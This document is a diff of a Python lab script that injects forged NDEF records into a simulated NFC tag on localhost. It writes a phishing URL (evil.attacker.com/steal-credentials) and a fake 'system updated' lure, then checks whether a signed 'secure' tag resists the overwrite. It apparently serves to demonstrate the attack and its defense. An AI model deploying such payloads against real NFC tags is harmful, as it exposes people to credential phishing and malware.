@@ -1,27 +1,29 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 """
-NFC NDEF Injector — ghi đè content thẻ NFC bằng payload giả mạo
+NFC NDEF Injector - overwrite NFC tag content with malicious payload
 
 Usage:
-    python nfc_injector.py              # Tấn công NFC tag thường (port 6011) — VULNERABLE
-    python nfc_injector.py --secure     # Tấn công Secure NFC tag (port 6012) — BLOCKED
+    python nfc_injector.py              # Attack normal NFC tag (port 6011) - VULNERABLE
+    python nfc_injector.py --secure     # Attack Secure NFC tag (port 6012) - BLOCKED
 """
-import socket, json, sys
+import socket, json, sys, io
 import ndef
 from colorama import Fore, init
 init(autoreset=True)
+
+# Fix Windows CP1252 encoding issue
+sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
+sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
 
 NFC_HOST = '127.0.0.1'
 NFC_PORT = 6012 if '--secure' in sys.argv else 6011
 
 PAYLOADS = {
-    'phishing_url': ('URI', 'https://evil.attacker.com/steal-credentials'),
-    'fake_wifi'   : ('MIME', 'application/vnd.wfa.wsc',
-                     b'\x10\x26\x00\x01\x01'  # WPS config giả
-                     b'\x10\x45\x00\x0cFakeHotspot'
-                     b'\x10\x27\x00\x08password'),
-    'malicious_text': ('TEXT', 'Hệ thống đã cập nhật. Truy cập: bit.ly/fake'),
+    'phishing_url':  ('URI',  'https://evil.attacker.com/steal-credentials'),
+    'malicious_text':('TEXT', 'System updated. Visit: bit.ly/malware'),
 }
+
 
 def make_payload(ptype: str) -> bytes:
     if ptype == 'phishing_url':
@@ -32,27 +34,37 @@ def make_payload(ptype: str) -> bytes:
         r = ndef.UriRecord('https://evil.example.com')
     return b''.join(ndef.message_encoder([r]))
 
+
 def inject(ptype: str):
     ndef_bytes = make_payload(ptype)
     s = socket.socket()
     s.settimeout(3)
     s.connect((NFC_HOST, NFC_PORT))
-    payload = {'cmd':'WRITE_NDEF','ndef_hex':ndef_bytes.hex()}
+    payload = {'cmd': 'WRITE_NDEF', 'ndef_hex': ndef_bytes.hex()}
     s.send(json.dumps(payload).encode())
     resp = json.loads(s.recv(512).decode())
     s.close()
     return resp
 
-mode = f"SECURE NFC Tag (port {NFC_PORT}) — Defense ON" if '--secure' in sys.argv else f"NFC Tag (port {NFC_PORT}) — No Defense"
+
+mode = f"SECURE NFC Tag (port {NFC_PORT}) - Defense ON" if '--secure' in sys.argv else f"NFC Tag (port {NFC_PORT}) - No Defense"
 print(f'{Fore.RED}=== NFC NDEF Injection Attack ===')
 print(f'{Fore.CYAN}Target: {mode}\n')
-for ptype in ['phishing_url','malicious_text']:
+
+for ptype in ['phishing_url', 'malicious_text']:
     print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
-    r = inject(ptype)
-    print(f'{Fore.RED}[INJECT] Result: {r}')
-    # Xác minh: đọc lại tag
-    s = socket.socket(); s.settimeout(2)
-    s.connect((NFC_HOST, NFC_PORT))
-    s.send(json.dumps({'cmd':'READ_NDEF'}).encode())
-    verify = json.loads(s.recv(2048).decode()); s.close()
-    print(f'{Fore.RED}[VERIFY] New NDEF: {verify["records"]}\n')
+    try:
+        r = inject(ptype)
+        print(f'{Fore.RED}[INJECT] Result: {r}')
+        # Verify: read back the tag
+        cmd_read = 'READ_NDEF_SECURE' if '--secure' in sys.argv else 'READ_NDEF'
+        s = socket.socket(); s.settimeout(2)
+        s.connect((NFC_HOST, NFC_PORT))
+        s.send(json.dumps({'cmd': cmd_read}).encode())
+        verify = json.loads(s.recv(2048).decode()); s.close()
+        if '--secure' in sys.argv:
+            print(f'{Fore.YELLOW}[VERIFY] NDEF unchanged, signature still valid: {verify.get("signature","")[:16]}...\n')
+        else:
+            print(f'{Fore.RED}[VERIFY] New NDEF content: {verify.get("records", [])}\n')
+    except Exception as e:
+        print(f'{Fore.RED}[INJECT] Error: {e}\n')
